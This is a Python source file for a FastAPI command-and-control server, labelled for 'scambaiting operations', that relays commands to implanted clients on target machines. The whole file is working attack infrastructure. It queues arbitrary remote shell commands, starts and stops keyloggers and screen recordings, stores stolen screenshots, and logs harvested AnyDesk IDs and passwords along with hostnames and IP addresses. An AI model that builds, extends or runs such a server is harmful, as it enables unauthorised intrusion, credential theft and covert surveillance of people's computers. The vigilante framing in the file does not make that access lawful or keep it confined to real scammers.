#!/usr/bin/env python3
"""
C2 Server (Middleman)
Relays commands and streams between home.py (operator) and receiver.py (target).
Receives HTTP reports from anytime payload and AnyDesk events from blackhole.
"""

import os
import sys
import json
import threading
import time
import uuid
import asyncio
from datetime import datetime
from typing import Optional, Dict, Any, List
from collections import defaultdict

# FastAPI imports
from fastapi import FastAPI, Request, HTTPException, Depends, WebSocket, WebSocketDisconnect, UploadFile, File, Form
from fastapi.security import APIKeyHeader
from pydantic import BaseModel
import uvicorn

# Import from utils modules
from utils.config import C2_API_KEY, FASTAPI_PORT


# Ensure data directories exist
DATA_DIRS = [
    "data",
    "data/keylogs",
    "data/screenshots",
    "data/snapshots",
    "data/screenrecordings",
    "data/anytime_reports",
    "data/anydesk_events",
]

for dir_path in DATA_DIRS:
    os.makedirs(dir_path, exist_ok=True)


# ============================================================================
# DATA STRUCTURES
# ============================================================================

# Work queue: {receiver_id: [work_items]}
work_queue: Dict[str, List[Dict[str, Any]]] = defaultdict(list)

# Work results: {work_id: result}
work_results: Dict[str, Dict[str, Any]] = {}

# Active receivers: {receiver_id: last_seen_timestamp}
active_receivers: Dict[str, float] = {}

# WebSocket connections: {receiver_id: {"home": ws, "receiver": ws}}
websocket_connections: Dict[str, Dict[str, WebSocket]] = {}

# Streaming files: {receiver_id: {"keylogger": file_handle, "recording": writer}}
streaming_files: Dict[str, Dict[str, Any]] = {}

# Lock for thread-safe operations
queue_lock = threading.Lock()


# ============================================================================
# FASTAPI APPLICATION
# ============================================================================

# Create FastAPI app (docs disabled for security)
app = FastAPI(
    title="Kestrel C2 Server",
    description="Command & Control server for scambaiting operations",
    version="2.0.0",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)

# API Key security
api_key_header = APIKeyHeader(name="X-API-Key", auto_error=True)


def get_api_key(api_key: str = Depends(api_key_header)):
    """Validate API key from request header"""
    if api_key == C2_API_KEY:
        return api_key
    raise HTTPException(status_code=401, detail="Invalid API Key")


# Pydantic models for request validation
class AnyDeskEvent(BaseModel):
    """Model for AnyDesk connection events from Blackhole"""

    event_type: str
    anydesk_id: str
    ip_address: Optional[str] = None
    timestamp: str
    metadata: Dict[str, Any] = {}


class AnytimeReport(BaseModel):
    """Model for AnyDesk access reports from Anytime payload"""

    id: str
    password: str
    hostname: Optional[str] = None
    username: Optional[str] = None
    execution_time: Optional[str] = None
    os_version: Optional[str] = None
    timezone: Optional[str] = None
    timezone_offset: Optional[str] = None
    locale: Optional[str] = None
    local_ip: Optional[str] = None
    external_ip: Optional[str] = None


# ============================================================================
# PYDANTIC MODELS FOR C2 OPERATIONS
# ============================================================================


class CommandRequest(BaseModel):
    """Model for command execution request"""
    command: Optional[str] = None
    action: Optional[str] = None  # For actions like "screenshot"


class WorkPollRequest(BaseModel):
    """Model for work polling request"""
    receiver_id: str
    last_check: Optional[float] = None  # Timestamp of last poll


class WorkResultRequest(BaseModel):
    """Model for work result posting"""
    work_id: str
    receiver_id: str
    status: str  # "completed" or "failed"
    result: Optional[str] = None
    error: Optional[str] = None


# ============================================================================
# FASTAPI ROUTES
# ============================================================================


@app.post("/anydesk_event")
async def anydesk_event(event: AnyDeskEvent, request: Request, api_key: str = Depends(get_api_key)):
    """Receive AnyDesk connection events from Blackhole"""
    log_anydesk_event(event.dict(), request.client.host)
    return {"status": "ok"}


@app.post("/report")
async def anytime_report(report: AnytimeReport, request: Request, api_key: str = Depends(get_api_key)):
    """Receive AnyDesk access reports from Anytime payload"""
    log_anytime_report(report.dict(), request.client.host)
    return {"status": "ok"}


# ============================================================================
# HTTP ENDPOINTS FOR OPERATOR (home.py)
# ============================================================================


@app.post("/receiver/{receiver_id}/command")
async def execute_command(
    receiver_id: str,
    request: CommandRequest,
    api_key: str = Depends(get_api_key)
):
    """Execute a command or action on a receiver"""
    work_id = str(uuid.uuid4())
    
    # Determine work type
    if request.command:
        work_type = "command"
        params = {"command": request.command}
    elif request.action:
        work_type = request.action
        params = {}
    else:
        raise HTTPException(status_code=400, detail="Either 'command' or 'action' must be provided")
    
    # Create work item
    work_item = {
        "work_id": work_id,
        "receiver_id": receiver_id,
        "work_type": work_type,
        "params": params,
        "status": "pending",
        "created_at": time.time()
    }
    
    # Queue work
    with queue_lock:
        work_queue[receiver_id].append(work_item)
    
    print(f"[Queued work {work_id} for {receiver_id}]: {work_type}")
    return {"status": "ok", "work_id": work_id}


@app.get("/receiver/{receiver_id}/result/{work_id}")
async def get_result(
    receiver_id: str,
    work_id: str,
    api_key: str = Depends(get_api_key)
):
    """Get result of a work item"""
    with queue_lock:
        result = work_results.get(work_id)
    
    if not result:
        return {"status": "pending"}
    
    return result


@app.get("/receivers")
async def list_receivers(api_key: str = Depends(get_api_key)):
    """List all active receivers"""
    current_time = time.time()
    with queue_lock:
        active = {
            rid: {
                "last_seen": last_seen,
                "pending_work": len(work_queue.get(rid, [])),
                "has_control_ws": "home" in websocket_connections.get(rid, {}),
            }
            for rid, last_seen in active_receivers.items()
            if current_time - last_seen < 300  # Active if seen in last 5 minutes
        }
    
    return {
        "receivers": list(active.keys()),
        "details": active,
        "count": len(active)
    }


@app.post("/receiver/{receiver_id}/keylogger/start")
async def start_keylogger(
    receiver_id: str,
    api_key: str = Depends(get_api_key)
):
    """Start keylogger on receiver"""
    work_id = str(uuid.uuid4())
    work_item = {
        "work_id": work_id,
        "receiver_id": receiver_id,
        "work_type": "keylogger_start",
        "params": {},
        "status": "pending",
        "created_at": time.time()
    }
    
    with queue_lock:
        work_queue[receiver_id].append(work_item)
    
    return {"status": "ok", "work_id": work_id}


@app.post("/receiver/{receiver_id}/keylogger/stop")
async def stop_keylogger(
    receiver_id: str,
    api_key: str = Depends(get_api_key)
):
    """Stop keylogger on receiver"""
    work_id = str(uuid.uuid4())
    work_item = {
        "work_id": work_id,
        "receiver_id": receiver_id,
        "work_type": "keylogger_stop",
        "params": {},
        "status": "pending",
        "created_at": time.time()
    }
    
    with queue_lock:
        work_queue[receiver_id].append(work_item)
    
    return {"status": "ok", "work_id": work_id}


@app.post("/receiver/{receiver_id}/recording/start")
async def start_recording(
    receiver_id: str,
    api_key: str = Depends(get_api_key)
):
    """Start screen recording on receiver"""
    work_id = str(uuid.uuid4())
    work_item = {
        "work_id": work_id,
        "receiver_id": receiver_id,
        "work_type": "recording_start",
        "params": {},
        "status": "pending",
        "created_at": time.time()
    }
    
    with queue_lock:
        work_queue[receiver_id].append(work_item)
    
    return {"status": "ok", "work_id": work_id}


@app.post("/receiver/{receiver_id}/recording/stop")
async def stop_recording(
    receiver_id: str,
    api_key: str = Depends(get_api_key)
):
    """Stop screen recording on receiver"""
    work_id = str(uuid.uuid4())
    work_item = {
        "work_id": work_id,
        "receiver_id": receiver_id,
        "work_type": "recording_stop",
        "params": {},
        "status": "pending",
        "created_at": time.time()
    }
    
    with queue_lock:
        work_queue[receiver_id].append(work_item)
    
    return {"status": "ok", "work_id": work_id}


# ============================================================================
# HTTP ENDPOINTS FOR RECEIVER (Internal)
# ============================================================================


@app.post("/internal/work/poll")
async def poll_work(
    request: WorkPollRequest,
    api_key: str = Depends(get_api_key)
):
    """Poll for pending work items (receiver.py calls this)"""
    receiver_id = request.receiver_id
    
    # Update last seen
    active_receivers[receiver_id] = time.time()
    
    # Get all pending work since last check
    with queue_lock:
        if receiver_id not in work_queue:
            return {"work_items": []}
        
        if request.last_check:
            # Return only work created after last_check
            pending = [
                item for item in work_queue[receiver_id]
                if item.get("created_at", 0) > request.last_check
            ]
        else:
            # Return all pending work
            pending = [item for item in work_queue[receiver_id] if item.get("status") == "pending"]
    
    return {"work_items": pending}


@app.post("/internal/work/result")
async def post_work_result(
    result: WorkResultRequest,
    api_key: str = Depends(get_api_key)
):
    """Post work result (receiver.py calls this)"""
    with queue_lock:
        # Update work item status
        if result.receiver_id in work_queue:
            for item in work_queue[result.receiver_id]:
                if item["work_id"] == result.work_id:
                    item["status"] = result.status
                    item["completed_at"] = time.time()
                    break
        
        # Store result
        work_results[result.work_id] = {
            "work_id": result.work_id,
            "receiver_id": result.receiver_id,
            "status": result.status,
            "result": result.result,
            "error": result.error,
            "completed_at": time.time()
        }
    
    print(f"[Work {result.work_id} completed]: {result.status}")
    return {"status": "ok"}


@app.post("/internal/work/result/binary")
async def post_work_result_binary(
    receiver_id: str = Form(...),
    work_id: str = Form(...),
    data_type: str = Form(...),
    file: UploadFile = File(...),
    api_key: str = Depends(get_api_key)
):
    """Post binary work result (screenshot, snapshot, etc.)"""
    # Determine file path
    if data_type.startswith("ss_") or data_type.startswith("screenshot_"):
        filepath = f"data/screenshots/{data_type}"
    elif data_type.startswith("snap_") or data_type.startswith("snapshot_"):
        filepath = f"data/snapshots/{data_type}"
    else:
        filepath = f"data/{data_type}"
    
    # Save file
    content = await file.read()
    with open(filepath, "wb") as f:
        f.write(content)
    
    # Store result
    with queue_lock:
        if receiver_id in work_queue:
            for item in work_queue[receiver_id]:
                if item["work_id"] == work_id:
                    item["status"] = "completed"
                    item["completed_at"] = time.time()
                    break
        
        work_results[work_id] = {
            "work_id": work_id,
            "receiver_id": receiver_id,
            "status": "completed",
            "result_type": "binary",
            "data_type": data_type,
            "filepath": filepath,
            "size": len(content),
            "completed_at": time.time()
        }
    
    print(f"[Saved: {filepath} ({len(content):,} bytes)]\n")
    return {"status": "ok", "saved": filepath}


# ============================================================================
# LOGGING FUNCTIONS
# ============================================================================


def log_anydesk_event(data: dict, remote_addr: str):
    """Log AnyDesk connection event to files and display in console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Extract event data
    event_type = data.get("event_type", "UNKNOWN")
    anydesk_id = data.get("anydesk_id", "N/A")
    ip_address = data.get("ip_address", "N/A")
    event_timestamp = data.get("timestamp", timestamp)
    metadata = data.get("metadata", {})

    # Append to JSON Lines log (one event per line)
    today = datetime.now().strftime("%Y%m%d")
    jsonl_file = f"data/anydesk_events/events_{today}.jsonl"
    with open(jsonl_file, "a") as f:
        event_record = {
            "logged_at": timestamp,
            "event_timestamp": event_timestamp,
            "event_type": event_type,
            "anydesk_id": anydesk_id,
            "ip_address": ip_address,
            "metadata": metadata,
            "source_ip": remote_addr,
        }
        f.write(json.dumps(event_record) + "\n")

    # Append to master log (human-readable)
    with open("data/anydesk_events/master_log.txt", "a") as f:
        f.write(f"\n[{timestamp}] {event_type.upper()}\n")
        f.write(f"  AnyDesk ID:  {anydesk_id}\n")
        f.write(f"  IP Address:  {ip_address}\n")
        f.write(f"  Timestamp:   {event_timestamp}\n")
        if metadata:
            f.write(f"  Metadata:    {json.dumps(metadata)}\n")
        f.write(f"  Source:      {remote_addr}\n")
        f.write(f"-" * 60 + "\n")

    # Display in console based on event type
    if event_type == "incoming_request":
        print(f"\n{'='*70}")
        print(f"🚨 INCOMING CONNECTION REQUEST")
        print(f"{'='*70}")
        print(f"  AnyDesk ID:  \033[1;33m{anydesk_id}\033[0m")
        print(f"  IP Address:  \033[1;33m{ip_address}\033[0m")
        print(f"  Timestamp:   {event_timestamp}")
        if metadata.get("reverse_connection_initiated"):
            print(f"  \033[1;32m✓ Reverse connection initiated\033[0m")
        if metadata.get("firewall_auto_enabled"):
            print(f"  \033[1;32m✓ Firewall auto-enabled\033[0m")
        print(f"{'='*70}\n")

    elif event_type == "outgoing_accepted":
        print(f"\n{'='*70}")
        print(f"🎯 SUCCESS! REVERSE CONNECTION ACCEPTED")
        print(f"{'='*70}")
        print(f"  Target:      \033[1;32m{anydesk_id}\033[0m")
        print(f"  Timestamp:   {event_timestamp}")
        print(f"  \033[1;32mYOU NOW HAVE ACCESS TO SCAMMER'S MACHINE!\033[0m")
        print(f"{'='*70}\n")

    elif event_type == "outgoing_rejected":
        attempt = metadata.get("attempt_number", "N/A")
        print(f"\n{'='*70}")
        print(f"❌ REVERSE CONNECTION REJECTED")
        print(f"{'='*70}")
        print(f"  Target:      {anydesk_id}")
        print(f"  Attempt:     {attempt}")
        print(f"  Timestamp:   {event_timestamp}")
        print(f"{'='*70}\n")

    else:
        # Generic event display
        print(f"\n[ANYDESK EVENT] {event_type}: {anydesk_id} @ {ip_address}")


def log_anytime_report(data: dict, remote_addr: str):
    """Log AnyDesk access report to files and display in console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Extract all fields from report
    anydesk_id = data.get("id", "UNKNOWN")
    password = data.get("password", "UNKNOWN")
    hostname = data.get("hostname", "UNKNOWN")
    username = data.get("username", "UNKNOWN")
    execution_time = data.get("execution_time", "N/A")
    os_version = data.get("os_version", "N/A")
    timezone = data.get("timezone", "N/A")
    timezone_offset = data.get("timezone_offset", "N/A")
    locale = data.get("locale", "N/A")
    local_ip = data.get("local_ip", "N/A")
    external_ip = data.get("external_ip", "N/A")

    # Build complete report object
    report = {
        "timestamp": timestamp,
        "anydesk_id": anydesk_id,
        "password": password,
        "hostname": hostname,
        "username": username,
        "os_version": os_version,
        "timezone": timezone,
        "timezone_offset": timezone_offset,
        "locale": locale,
        "local_ip": local_ip,
        "external_ip": external_ip,
        "execution_time": execution_time,
        "source_ip": remote_addr,
    }

    # Save individual JSON report
    report_filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    report_file = f"data/anytime_reports/{report_filename}"
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2)

    # Append to master log
    with open("data/anytime_reports/master_log.txt", "a") as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"[{timestamp}] NEW ANYDESK ACCESS\n")
        f.write(f"{'='*70}\n")
        f.write(f"AnyDesk ID:  {anydesk_id}\n")
        f.write(f"Password:    {password}\n")
        f.write(f"\n")
        f.write(f"SYSTEM:\n")
        f.write(f"  Hostname:    {hostname}\n")
        f.write(f"  Username:    {username}\n")
        f.write(f"  OS:          {os_version}\n")
        f.write(f"\n")
        f.write(f"LOCATION:\n")
        f.write(f"  Timezone:    {timezone} (UTC{timezone_offset})\n")
        f.write(f"  Locale:      {locale}\n")
        f.write(f"  Local IP:    {local_ip}\n")
        f.write(f"  External IP: {external_ip}\n")
        f.write(f"\n")
        f.write(f"PERFORMANCE:\n")
        f.write(f"  Exec Time:   {execution_time}s\n")
        f.write(f"  Source IP:   {remote_addr}\n")
        f.write(f"\n")

    # Display prominently in console
    print(f"\n{'='*70}")
    print(f"🎯 NEW ANYDESK ACCESS REPORTED!")
    print(f"{'='*70}")
    print(f"  AnyDesk ID:  \033[1;32m{anydesk_id}\033[0m")
    print(f"  Password:    \033[1;32m{password}\033[0m")
    print(f"")
    print(f"  SYSTEM:")
    print(f"    Hostname:    {hostname}")
    print(f"    Username:    {username}")
    print(f"    OS:          {os_version}")
    print(f"")
    print(f"  LOCATION:")
    print(f"    Timezone:    {timezone} (UTC{timezone_offset})")
    print(f"    Locale:      {locale}")
    print(f"    Local IP:    {local_ip}")
    print(f"    External IP: {external_ip}")
    print(f"")
    print(f"  PERFORMANCE:")
    print(f"    Exec Time:   {execution_time}s")
    print(f"    Source IP:   {remote_addr}")
    print(f"{'='*70}")
    print(f"  Saved to: {report_file}")
    print(f"{'='*70}\n")


# ============================================================================
# WEBSOCKET ENDPOINTS (Operator - home.py)
# ============================================================================


@app.websocket("/control/{receiver_id}")
async def control_websocket(websocket: WebSocket, receiver_id: str):
    """Control WebSocket for operator (home.py) - relays to receiver"""
    await websocket.accept()
    
    with queue_lock:
        if receiver_id not in websocket_connections:
            websocket_connections[receiver_id] = {}
        websocket_connections[receiver_id]["home"] = websocket
    
    print(f"[Control WS] home.py connected for {receiver_id}")
    
    try:
        while True:
            # Receive message from home.py
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Relay to receiver if connected
            receiver_ws = websocket_connections.get(receiver_id, {}).get("receiver")
            if receiver_ws:
                await receiver_ws.send_text(json.dumps(message))
            else:
                # Receiver not connected, send error back
                await websocket.send_text(json.dumps({
                    "type": "error",
                    "message": "Receiver not connected"
                }))
    except WebSocketDisconnect:
        print(f"[Control WS] home.py disconnected for {receiver_id}")
    finally:
        with queue_lock:
            if receiver_id in websocket_connections:
                websocket_connections[receiver_id].pop("home", None)


@app.websocket("/stream/keylogger/{receiver_id}")
async def keylogger_stream_websocket(websocket: WebSocket, receiver_id: str):
    """Keylogger stream WebSocket for operator (home.py) - relays from receiver"""
    await websocket.accept()
    
    # Open file for keylog
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"data/keylogs/keylog_{timestamp}.txt"
    file_handle = open(filename, "w", encoding="utf-8")
    
    with queue_lock:
        if receiver_id not in streaming_files:
            streaming_files[receiver_id] = {}
        streaming_files[receiver_id]["keylogger"] = file_handle
    
    print(f"[Keylogger WS] home.py connected for {receiver_id} - saving to {filename}")
    
    try:
        while True:
            # Receive stream data from receiver (via relay)
            data = await websocket.receive_text()
            message = json.loads(data)
            
            if message.get("type") == "stream_data":
                # Write to file and echo to console
                text = message.get("data", "")
                sys.stdout.write(text)
                sys.stdout.flush()
                file_handle.write(text)
                file_handle.flush()
            elif message.get("type") == "stream_end":
                break
    except WebSocketDisconnect:
        print(f"[Keylogger WS] home.py disconnected for {receiver_id}")
    finally:
        file_handle.close()
        with queue_lock:
            if receiver_id in streaming_files:
                streaming_files[receiver_id].pop("keylogger", None)
        print(f"[Keylog saved to {filename}]")


@app.websocket("/stream/recording/{receiver_id}")
async def recording_stream_websocket(websocket: WebSocket, receiver_id: str):
    """Recording stream WebSocket for operator (home.py) - relays from receiver"""
    await websocket.accept()
    
    try:
        import cv2
        import numpy as np
    except ImportError:
        await websocket.send_text(json.dumps({
            "type": "error",
            "message": "opencv-python not installed"
        }))
        await websocket.close()
        return
    
    # Receive metadata
    metadata_msg = await websocket.receive_text()
    metadata = json.loads(metadata_msg)
    
    if metadata.get("type") != "stream_start":
        await websocket.close()
        return
    
    resolution = metadata.get("resolution", "1920x1080")
    fps = metadata.get("fps", 5)
    width, height = map(int, resolution.split("x"))
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"data/screenrecordings/recording_{timestamp}.mp4"
    
    # Setup video writer
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    writer = cv2.VideoWriter(filename, fourcc, fps, (width, height))
    
    if not writer.isOpened():
        await websocket.send_text(json.dumps({
            "type": "error",
            "message": "Could not initialize video writer"
        }))
        await websocket.close()
        return
    
    with queue_lock:
        if receiver_id not in streaming_files:
            streaming_files[receiver_id] = {}
        streaming_files[receiver_id]["recording"] = writer
    
    print(f"[Recording WS] home.py connected for {receiver_id} - saving to {filename}")
    frame_count = 0
    
    try:
        while True:
            # Receive frame data
            data = await websocket.receive_bytes()
            
            # Decode JPEG frame
            nparr = np.frombuffer(data, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            
            if frame is not None:
                writer.write(frame)
                frame_count += 1
            else:
                # Check if it's end marker
                if data == b"<RECORDING_END>":
                    break
    except WebSocketDisconnect:
        print(f"[Recording WS] home.py disconnected for {receiver_id}")
    finally:
        writer.release()
        with queue_lock:
            if receiver_id in streaming_files:
                streaming_files[receiver_id].pop("recording", None)
        print(f"[Recording complete: {filename}]")
        print(f"[Total frames: {frame_count}]")


# ============================================================================
# WEBSOCKET ENDPOINTS (Internal - receiver.py)
# ============================================================================


@app.websocket("/internal/control/{receiver_id}")
async def internal_control_websocket(websocket: WebSocket, receiver_id: str):
    """Control WebSocket for receiver (receiver.py) - relays to home.py"""
    await websocket.accept()
    
    with queue_lock:
        if receiver_id not in websocket_connections:
            websocket_connections[receiver_id] = {}
        websocket_connections[receiver_id]["receiver"] = websocket
    
    print(f"[Control WS] receiver.py connected for {receiver_id}")
    
    try:
        while True:
            # Receive message from receiver
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Relay to home.py if connected
            home_ws = websocket_connections.get(receiver_id, {}).get("home")
            if home_ws:
                await home_ws.send_text(json.dumps(message))
    except WebSocketDisconnect:
        print(f"[Control WS] receiver.py disconnected for {receiver_id}")
    finally:
        with queue_lock:
            if receiver_id in websocket_connections:
                websocket_connections[receiver_id].pop("receiver", None)


@app.websocket("/internal/stream/keylogger/{receiver_id}")
async def internal_keylogger_stream_websocket(websocket: WebSocket, receiver_id: str):
    """Keylogger stream WebSocket for receiver (receiver.py) - relays to home.py"""
    await websocket.accept()
    
    print(f"[Keylogger WS] receiver.py connected for {receiver_id}")
    
    # Get home.py WebSocket connection
    home_ws = websocket_connections.get(receiver_id, {}).get("home")
    if not home_ws:
        await websocket.close(code=1008, reason="No home.py connection")
        return
    
    try:
        while True:
            # Receive stream data from receiver
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Relay to home.py
            await home_ws.send_text(json.dumps(message))
            
            # Also write to file if available
            with queue_lock:
                file_handle = streaming_files.get(receiver_id, {}).get("keylogger")
                if file_handle and message.get("type") == "stream_data":
                    file_handle.write(message.get("data", ""))
                    file_handle.flush()
    except WebSocketDisconnect:
        print(f"[Keylogger WS] receiver.py disconnected for {receiver_id}")


@app.websocket("/internal/stream/recording/{receiver_id}")
async def internal_recording_stream_websocket(websocket: WebSocket, receiver_id: str):
    """Recording stream WebSocket for receiver (receiver.py) - relays to home.py"""
    await websocket.accept()
    
    print(f"[Recording WS] receiver.py connected for {receiver_id}")
    
    # Get home.py WebSocket connection
    home_ws = websocket_connections.get(receiver_id, {}).get("home")
    if not home_ws:
        await websocket.close(code=1008, reason="No home.py connection")
        return
    
    try:
        # First message should be metadata
        metadata_msg = await websocket.receive_text()
        metadata = json.loads(metadata_msg)
        
        # Relay metadata to home.py
        await home_ws.send_text(json.dumps(metadata))
        
        while True:
            # Receive frame data from receiver
            data = await websocket.receive_bytes()
            
            # Relay to home.py
            await home_ws.send_bytes(data)
            
            # Also write to video writer if available
            with queue_lock:
                writer = streaming_files.get(receiver_id, {}).get("recording")
                if writer and data != b"<RECORDING_END>":
                    try:
                        import cv2
                        import numpy as np
                        nparr = np.frombuffer(data, np.uint8)
                        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                        if frame is not None:
                            writer.write(frame)
                    except:
                        pass
    except WebSocketDisconnect:
        print(f"[Recording WS] receiver.py disconnected for {receiver_id}")


# ============================================================================
# SERVER STARTUP
# ============================================================================


def start_fastapi_server():
    """Start FastAPI server with uvicorn"""
    print(f"[FastAPI] Server running on http://0.0.0.0:{FASTAPI_PORT}")
    print("[FastAPI] Waiting for connections...\n")
    uvicorn.run(app, host="0.0.0.0", port=FASTAPI_PORT, log_level="info")


if __name__ == "__main__":
    print("\n[ C2 Server - HTTP/WebSocket Relay ]\n")
    print("Features:")
    print(f"  • HTTP API (port {FASTAPI_PORT}) - Command & Control")
    print("  • WebSocket Relay - Real-time control and streaming")
    print("  • POST /report - Anytime payload reports")
    print("  • POST /anydesk_event - Blackhole AnyDesk events")
    print("  • API Key authentication (X-API-Key header)")
    print()
    # Start FastAPI server (blocking)
    start_fastapi_server()
